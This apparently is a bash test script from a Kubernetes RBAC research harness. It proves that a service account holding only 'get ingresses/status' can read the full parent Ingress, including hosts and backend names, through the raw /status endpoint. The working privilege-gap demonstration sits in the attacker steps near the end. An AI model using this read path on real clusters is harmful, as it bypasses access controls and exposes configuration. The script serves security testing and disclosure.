#!/usr/bin/env bash
# Implicit permission: get ingresses/status -> get ingresses
#                                              (ingresses-status-reads-parent)
#
# Proof: an identity granted ONLY `get ingresses/status` cannot `get ingresses`,
# yet a GET on the `/status` subresource returns the ENTIRE stored Ingress
# object -- metadata and spec included -- because the status store shares the
# parent REST store and does not narrow the read. So "status-only" visibility is
# full-object visibility (routing rules, backend service names, hosts).
# Mechanism: ../transitions/get-status-reads-parent.md
source "$(dirname "$0")/../lib.sh"
test_start "ingresses-status-reads-parent"

# networking.k8s.io Ingress may be absent on a stripped cluster; honest SKIP.
if ! K api-resources --api-group=networking.k8s.io 2>/dev/null | grep -qw ingresses; then
  echo "RESULT: SKIP ingresses-status-reads-parent networking.k8s.io Ingress API not present on this cluster"
  exit 3
fi

# Self-cleanup (see note in deployments-status-updates-parent.sh): new_ns's
# _track is lost to its subshell under bash 4.2 + set -u, so we track our own
# objects and delete them on exit, chaining the harness _cleanup.
WP_OBJS=()
wp_track() { WP_OBJS+=("$1"); }
wp_cleanup() {
  local rc=$? o
  for o in "${WP_OBJS[@]:-}"; do [ -n "$o" ] && K delete "$o" --ignore-not-found --wait=false >/dev/null 2>&1 || true; done
  _cleanup || true
  return $rc
}
trap wp_cleanup EXIT

ns="$(new_ns ing-status)"; wp_track "namespace/$ns"

marker="wp-ing-host-${RUN_ID}.example.com"
step "admin creates Ingress 'victim' with host '$marker' in its spec"
K -n "$ns" apply -f - >/dev/null <<EOF || fail "could not create ingress"
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata: { name: victim }
spec:
  rules:
  - host: "$marker"
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: wp-backend
            port: { number: 80 }
EOF

mk_sa "$ns" attacker
# ONLY ingresses/status get. Deliberately NO `get ingresses` on the parent.
grant_ns "$ns" attacker "networking.k8s.io" "ingresses/status" "get"
subj="$(sa_subject "$ns" attacker)"

assert_can    "$subj" get ingresses/status "$ns"   # holds p
assert_cannot "$subj" get ingresses        "$ns"   # THE GAP: lacks q

step "attacker GETs ingresses/status via the raw subresource endpoint"
out="$(as_subj "$subj" get --raw "/apis/networking.k8s.io/v1/namespaces/$ns/ingresses/victim/status" 2>/dev/null)" \
  || fail "attacker could not GET ingresses/status"
assert_nonempty "$out" "ingresses/status GET returned a body"

# EFFECT: the /status GET returned the FULL parent Ingress -- its spec (host,
# backend) is present, which `get ingresses` grants but the status grant does not.
assert_contains "$out" "\"kind\":\"Ingress\"" "status GET returns a full Ingress object, not a status projection"
assert_contains "$out" "$marker"              "status GET leaked the parent's spec (routing host)"
assert_contains "$out" "wp-backend"           "status GET leaked the parent's backend service name"
step "get ingresses/status returned the whole parent Ingress (host '$marker', backend wp-backend) -- full-object read via 'status-only' grant"

test_pass
